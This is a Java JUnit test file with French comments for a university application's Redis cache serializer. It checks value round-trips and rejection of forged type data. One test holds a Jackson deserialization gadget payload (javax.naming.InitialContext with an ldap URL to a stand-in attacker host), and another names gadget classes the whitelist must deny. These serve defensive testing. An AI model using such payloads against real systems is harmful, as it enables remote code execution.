package cd.genuc.config.cache;

import cd.genuc.config.CacheConfig;
import cd.genuc.model.Universite;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Garde-fous sur la sérialisation des valeurs mises en cache.
 *
 * <p>Ce sont les deux propriétés dont dépend tout le reste : une valeur doit revenir de Redis
 * dans son type d'origine (sinon le cache ne sert jamais et chaque lecture repart en base), et
 * une valeur forgée ne doit pas pouvoir faire instancier n'importe quelle classe du
 * classpath.</p>
 */
class SerialisationCacheTest {

    private final ObjectMapper mapper = CacheConfig.mapperCache();

    @Test
    @DisplayName("Une entité cachée revient dans son type d'origine, pas en LinkedHashMap")
    void allerRetourEntite() throws Exception {
        Universite universite = Universite.builder()
                .nom("Université de Kinshasa")
                .code("UNIKIN")
                .ville("Kinshasa")
                .fraisInscription(50.0)
                .actif(true)
                .facultes(new ArrayList<>(List.of("Droit", "Médecine")))
                .build();

        String json = mapper.writeValueAsString(universite);
        Object relu = mapper.readValue(json, Object.class);

        assertThat(relu).isInstanceOf(Universite.class);
        Universite copie = (Universite) relu;
        assertThat(copie.getCode()).isEqualTo("UNIKIN");
        assertThat(copie.getNom()).isEqualTo("Université de Kinshasa");
        assertThat(copie.getFacultes()).containsExactly("Droit", "Médecine");
    }

    @Test
    @DisplayName("Une Map de DTO (situation financière, statut de paiement) survit à l'aller-retour")
    void allerRetourMap() throws Exception {
        var source = new java.util.LinkedHashMap<String, Object>();
        source.put("reference", "PAY-2026-1");
        source.put("montant", 125.5);
        source.put("dateValidation", java.time.LocalDate.of(2026, 7, 27));

        String json = mapper.writeValueAsString(source);
        Object relu = mapper.readValue(json, Object.class);

        assertThat(relu).isInstanceOf(java.util.Map.class);
        @SuppressWarnings("unchecked")
        var copie = (java.util.Map<String, Object>) relu;
        assertThat(copie.get("reference")).isEqualTo("PAY-2026-1");
        assertThat(copie.get("montant")).isEqualTo(125.5);
        assertThat(copie.get("dateValidation")).isEqualTo(java.time.LocalDate.of(2026, 7, 27));
    }

    @Test
    @DisplayName("Une valeur forgée pointant hors des paquets autorisés est REFUSÉE")
    void typeHorsListeBlancheRefuse() {
        // Ce que produirait une entrée Redis empoisonnée : un @class arbitraire.
        // Avec LaissezFaireSubTypeValidator (configuration précédente), Jackson tentait
        // d'instancier la classe nommée — le schéma d'exécution de code à distance classique.
        String forge = """
                ["javax.naming.InitialContext",{"providerUrl":"ldap://attaquant.example/a"}]
                """;

        assertThatThrownBy(() -> mapper.readValue(forge, Object.class))
                .hasMessageContaining("javax.naming.InitialContext");
    }

    @Test
    @DisplayName("Le validateur n'autorise que les paquets du domaine et les types JDK de base")
    void listeBlancheDesPaquets() throws Exception {
        var validateur = CacheConfig.validateurTypes();
        var config = new ObjectMapper().getDeserializationConfig();
        var typeBase = mapper.getTypeFactory().constructType(Object.class);

        assertThat(validateur.validateSubClassName(config, typeBase, "cd.genuc.model.Universite"))
                .isEqualTo(com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator.Validity.ALLOWED);
        assertThat(validateur.validateSubClassName(config, typeBase, "java.util.ArrayList"))
                .isEqualTo(com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator.Validity.ALLOWED);
        assertThat(validateur.validateSubClassName(config, typeBase, "org.hibernate.collection.spi.PersistentBag"))
                .isNotEqualTo(com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator.Validity.ALLOWED);
        assertThat(validateur.validateSubClassName(config, typeBase, "org.springframework.context.support.ClassPathXmlApplicationContext"))
                .isNotEqualTo(com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator.Validity.ALLOWED);
    }
}
